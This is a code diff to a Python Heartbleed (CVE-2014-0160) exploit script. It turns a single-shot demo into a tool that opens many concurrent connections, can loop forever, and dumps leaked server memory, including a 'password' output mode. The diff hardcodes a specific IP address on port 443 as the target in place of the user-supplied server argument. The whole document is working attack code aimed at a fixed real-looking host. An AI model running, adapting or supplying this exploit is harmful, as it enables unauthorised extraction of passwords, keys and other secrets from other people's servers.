@@ -38,6 +38,9 @@ hb = unhexlify('''
 	01 40 00
 ''')
 
+# global active count
+active = 0
+
 def hexdump(s):
 	for b in range(0, len(s), 16):
 		lin = [c for c in s[b : b + 16]]
@@ -90,7 +93,12 @@ def recvMessage(reader):
 	return typ, ver, payload
 
 @asyncio.coroutine
-def bleed(loop):
+def bleed(concurrency, forever):
+	global active
+	if active < concurrency:
+		active += 1
+		asyncio.async(bleed(concurrency, forever))
+
 	reader, writer = yield from asyncio.open_connection('218.244.141.205', 443, loop=loop)
 	writer.write(hello)
 
@@ -113,7 +121,6 @@ def bleed(loop):
 
 	if typ is None:
 		logging.error('No heartbeat response received, server likely not vulnerable')
-
 	elif typ == 24:
 		logging.info('Received heartbeat response:')
 		dump(payload)
@@ -121,7 +128,6 @@ def bleed(loop):
 			logging.warning('Server returned more data than it should - server is vulnerable!')
 		else:
 			logging.warning('Server processed malformed heartbeat, but did not return any extra data.')
-
 	elif typ == 21:
 		logging.warning('Received alert:')
 		dump(payload)
@@ -129,11 +135,17 @@ def bleed(loop):
 	else:
 		logging.error('Unknown response type')
 
+	active -= 1
+	if forever and (active < concurrency):
+		active += 1
+		asyncio.async(bleed(concurrency, forever))
+
 if __name__ == '__main__':
 	optionParser = OptionParser(usage='%prog server [option]', description='Demo of heartbleed(CVE-2014-0160)')
-	optionParser.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
-	optionParser.add_option('-o', '--output', type='string', default='text', help='Output format [password, text, hex] (default: text)')
-	optionParser.add_option('-l', '--loop', action='store_true', default=False, help='Whether loop forever')
+	optionParser.add_option('-p', '--port', type='int', default=443, help='TCP port to test')
+	optionParser.add_option('-o', '--output', type='string', default='text', help='Output format [password, text, hex]')
+	optionParser.add_option('-c', '--concurrency', type='int', default=1, help='Concurrency')
+	optionParser.add_option('-f', '--forever', action='store_true', default=False, help='Forever')
 
 	option, arg = optionParser.parse_args()
 	if len(arg) < 1:
@@ -144,17 +156,12 @@ if __name__ == '__main__':
 			logging.basicConfig(level=logging.CRITICAL)
 		elif option.output == 'text':
 			dump = textdump
-			logging.basicConfig(level=logging.INFO)
+			logging.basicConfig(level=logging.CRITICAL)
 		elif option.output == 'hex':
 			dump = hexdump
 			logging.basicConfig(level=logging.INFO)
 
-		if option.loop:
-			while True:
-				loop = asyncio.get_event_loop()
-				loop.run_until_complete(bleed(loop))
-				loop.close()
-		else:
-			loop = asyncio.get_event_loop()
-			loop.run_until_complete(bleed(loop))
-			loop.close()
+		loop = asyncio.get_event_loop()
+		asyncio.async(bleed(option.concurrency, option.forever))
+		loop.run_forever()
+		loop.close()
